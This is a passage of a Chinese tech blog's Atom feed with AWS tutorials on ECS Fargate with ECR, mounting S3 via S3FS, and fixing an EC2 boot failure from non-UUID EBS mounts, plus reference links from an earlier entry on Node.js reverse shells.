参考链接"></a>0x04 参考链接</h2><ul><li><a href="https://klionsec.github.io/2016/09/27/revese-shell/" target="_blank" rel="noopener">你和目标只差一个shell的距离</a></li><li><a href="https://dev.classmethod.jp/cloud/aws/check-os-layer-because-change-amazon-linux-2/" target="_blank" rel="noopener">AWS LambdaのOSがAmazon Linux 2に変わっていたから中身を覗いてみた</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;原本在测AWS Lambda，后来变成研究Node.js反弹shell了，hhh。&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ECS Fargate 初体验</title>
    <link href="https://tonghuaroot.com/2019/11/19/AWS-ECS-Fargate/"/>
    <id>https://tonghuaroot.com/2019/11/19/AWS-ECS-Fargate/</id>
    <published>2019-11-19T04:17:55.000Z</published>
    <updated>2019-11-19T12:18:41.103Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对标K8S，ECS就是AWS上做docker集群管理用的。ECS Fargate就是托管的，我不需要登上实例管理了。这里搞个简单的demo测试一下。</p><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>用的cn-northwest-1的ECS。</p><ol><li>先创建一个集群<br><img src="FBBDAB5995CD4E82B94CF0800ABBE4A2" alt="image"></li></ol><p><img src="44A011E1C08B456596D14D04FF699C4F" alt="image"></p><p><img src="2D94472F16AE4289A6E68D70E32F62F6" alt="image"></p><p>稍等片刻，集群就创建完了</p><p><img src="4FF4DF34DB7745AFBB57A9A6842559CC" alt="image"></p><ol start="2"><li>然后再搞个ECR仓库用来装docker镜像</li></ol><p><img src="7108A100DB114454813C6E01527EB30F" alt="image"></p><p><img src="C5C663FA6ED646BE94CD71E4A663EE9E" alt="image"></p><ol start="3"><li>仓库创建完了之后，回到EC2实例上，把dockerhub上的镜像拖回来搞到ECR上<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ec2-user]# docker pull nginx</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">Digest: sha256:922c815aa4df050d4df476e92daed4231f466acc8ee90e0e774951b0fd7195a4</span><br><span class="line">Status: Image is up to date for nginx:latest</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]#</span><br></pre></td></tr></table></figure></li></ol><p><img src="CBF341A5AF9143D09D59175B527E07EB" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ec2-user]# $(aws ecr get-login --no-include-email --region cn-northwest-1)</span><br><span class="line">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]# docker tag nginx:latest 297692170000.dkr.ecr.cn-northwest-1.amazonaws.com.cn/tonghua-ecr-repo:latest</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]# docker push 297692170000.dkr.ecr.cn-northwest-1.amazonaws.com.cn/tonghua-ecr-repo:latest</span><br><span class="line">The push refers to repository [297692170000.dkr.ecr.cn-northwest-1.amazonaws.com.cn/tonghua-ecr-repo]</span><br><span class="line">a89b8f05da3a: Pushed</span><br><span class="line">6eaad811af02: Pushed</span><br><span class="line">b67d19e65ef6: Pushed</span><br><span class="line">latest: digest: sha256:f56b43e9913cef097f246d65119df4eda1d61670f7f2ab720831a01f66f6ff9c size: 948</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]#</span><br></pre></td></tr></table></figure><p><img src="E361F462C2C44FB6A0D0D209F84A0850" alt="image"></p><p>可以看到已经传成功了：</p><p><img src="50083D3C162C4C4887BA50D346D69A19" alt="image"></p><h2 id="0x02-创建服务"><a href="#0x02-创建服务" class="headerlink" title="0x02 创建服务"></a>0x02 创建服务</h2><p>前面准备工作就算做完了，这头我就继续拿着传上来的镜像部署服务了。</p><ol><li>创建任务定义<br><img src="4CA8FEC7E4694CC2ABB688E8C8C95858" alt="image"></li></ol><p><img src="9097E8E63E7D468992B7065DD5D20DFC" alt="image"></p><p><img src="B987529C49B6466BA7CEEA5CA96D7EC9" alt="image"></p><p>别的都用默认值，然后再增加下容器。</p><p><img src="4035863F7104405A924EAA61BEBC168E" alt="image"></p><p>可以看到，任务定义已经创建成功了，</p><p><img src="C81826E7AD0641A3964033BAB757DDFC" alt="image"></p><ol start="2"><li>然后进到一个集群里头创建一个服务试试：</li></ol><p><img src="68A003A152294183A3C7AE3444CD6C76" alt="image"></p><p><img src="E85C72E4B637485895E27426B2A155EF" alt="image"></p><p>emm，刚才创建的任务定义忘了映射端口了，重新创建一个把docker容器的80端口映射出来。</p><p>然后还需要创建一个ALB，部署在ECS前端。</p><p><img src="D7DD9C6E31E24064830987AC0CCBE4BE" alt="image"></p><p>继续下一步：</p><p><img src="5889746F488442B895AFB5F36A698674" alt="image"></p><p>然后等着启动就行了：<br><img src="E3A420F6B5FE41878A61CA8271951C49" alt="image"></p><p>可以看到，都成了。<br><img src="F102DC68F50D46F59AF5FF9B4693B465" alt="image"></p><h2 id="0x03-troubleshooting"><a href="#0x03-troubleshooting" class="headerlink" title="0x03 troubleshooting"></a>0x03 troubleshooting</h2><p>一般都是看【服务】的【事件】，【任务】的【log】，具体情况具体看吧。<br><img src="B2FAC9C250A74D9C89A3F92ECBBEC643" alt="image"></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>简单记录下，文档看的云里雾里，还是动手一把梭来的快一点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;对标K8S，ECS就是AWS上做docker集群管理用的。ECS Fargate就是托管的，我不需要
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>S3FS 简介及部署</title>
    <link href="https://tonghuaroot.com/2019/11/16/how-to-install-S3FS/"/>
    <id>https://tonghuaroot.com/2019/11/16/how-to-install-S3FS/</id>
    <published>2019-11-16T23:13:51.000Z</published>
    <updated>2019-11-17T07:16:58.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>S3FS可以把S3 Bucket可以向挂盘一样，挂在本地，适用于Linux和Mac OS，完事复制粘贴写文件啥的跟普通的文件夹几乎没啥差别，体验很棒。<br>当然，也有一些缺点，这个后面再说。（如果你遇不到它，那就是没缺点，大雾hhh）</p><h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><ul><li>Amazon Linux 2</li></ul><h2 id="0x02-操作步骤"><a href="#0x02-操作步骤" class="headerlink" title="0x02 操作步骤"></a>0x02 操作步骤</h2><ol><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo amazon-linux-extras install epel</span><br><span class="line">sudo yum install s3fs-fuse</span><br></pre></td></tr></table></figure></li><li><p>挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s3fs s3fs-tonghua s3fs_local #（前面是桶名，后面是本地需要挂载到的目录）</span><br></pre></td></tr></table></figure></li></ol><p>如果向上面那么玩，你使用中国区的S3的话，那一定是不成功的。通过debug信息我们可以看到其把请求打到global去了，“那前朝的剑，斩本朝的官”，那自然是行不通的，我们要把region改到中国来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s3fs s3fs-tonghua s3fs_local -o dbglevel=info -f -o curldbg # 开启debug日志</span><br></pre></td></tr></table></figure></p><p>可以通过如下方式修改endpoint，可以看到已经成功了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 /]# s3fs s3fs-tonghua s3fs_local -o url=https://s3.cn-north-1.amazonaws.com.cn                       [root@ip-10-0-0-64 /]# cd s3fs_local/</span><br><span class="line">[root@ip-10-0-0-64 s3fs_local]# ls</span><br><span class="line">test01_no_version.txt</span><br><span class="line">[root@ip-10-0-0-64 s3fs_local]#</span><br></pre></td></tr></table></figure></p><p>这种情况下，如果我机器重启了，那挂载的S3就没了。所以我们要给他换成/etc/fstab，保证其重启后也无需重新下载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 s3fs_local]$ cat /etc/fstab</span><br><span class="line">#</span><br><span class="line">UUID=8a9e0fcb-f415-4a3f-931d-919fadf8e22c     /           xfs    defaults,noatime  1   1</span><br><span class="line">s3fs#s3fs-tonghua /s3fs_local fuse _netdev,nonempty,allow_other,use_path_request_style,url=https://s3.cn-north-1.amazonaws.com.cn 0 0</span><br><span class="line">[ec2-user@ip-10-0-0-64 s3fs_local]$配置</span><br></pre></td></tr></table></figure></p><p>以上就完成了S3FS的配置。</p><h2 id="0x03-说说S3FS的利弊"><a href="#0x03-说说S3FS的利弊" class="headerlink" title="0x03 说说S3FS的利弊"></a>0x03 说说S3FS的利弊</h2><p>S3FS本质上是对象存储，其跟块存储还是有区别的，块存储我如果修改一个大文件的话，背后只修改对应的block，但是S3就不一样了，如果我传一个超大的文件，几个G或者T的，那他是会整个往S3传的，既费钱还有一致性的问题。<br>然后如果我读写频率太高的话，还容易被服务限制。<br>关于其缺点的话，官方文档说的也比较清楚了，我这头就不再赘述，有兴趣的同学可以去看看：<a href="https://github.com/s3fs-fuse/s3fs-fuse" target="_blank" rel="noopener">https://github.com/s3fs-fuse/s3fs-fuse</a></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>试了下S3FS，有的场景确实很方便，具体使用的话还是要结合自身业务场景，选择合适的数据传输、存储方式。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://github.com/s3fs-fuse/s3fs-fuse" target="_blank" rel="noopener">FUSE-based file system backed by Amazon S3</a></li><li><a href="http://manpages.ubuntu.com/manpages/xenial/man1/s3fs.1.html" target="_blank" rel="noopener">s3fs</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;S3FS可以把S3 Bucket可以向挂盘一样，挂在本地，适用于Linux和Mac OS，完事复制粘
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>EBS卷挂载不用UUID导致的EC2实例无法正常启动的问题</title>
    <link href="https://tonghuaroot.com/2019/11/14/AWS-EBS-UUID-EC2-Change-Instance-Type/"/>
    <id>https://tonghuaroot.com/2019/11/14/AWS-EBS-UUID-EC2-Change-Instance-Type/</id>
    <published>2019-11-14T21:45:52.000Z</published>
    <updated>2019-11-15T05:49:42.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我有一台t2.micro的EC2实例，上头挂了一个EBS卷，完事有一天我给他切成t3.micro的实例，再重启实例之后就起不来了，这是啥原因导致的呢？<br>简单来讲原因是我在挂在EBS卷的时候，用的是文件名，不是UUID，而我切到NVME的时候，我的设备命令方式就变了，然后找不到原来那个文件名的EBS卷，所以就报错了，解决这个问题的方法也很简单，改成UUID就完事了。</p><h2 id="0x01-问题复现"><a href="#0x01-问题复现" class="headerlink" title="0x01 问题复现"></a>0x01 问题复现</h2><ol><li><p>启动一台t2.micro的EC2实例，并且给他挂载一个EBS卷</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">UUID=0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9     /           xfs    defaults,noatime  1   1</span><br><span class="line">/dev/xvdf /data xfs defaults,noatime 1 1</span><br><span class="line"></span><br><span class="line">sudo mount -a</span><br></pre></td></tr></table></figure></li><li><p>挂载成功后重启实力观察下正常情况下系统日志的输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span 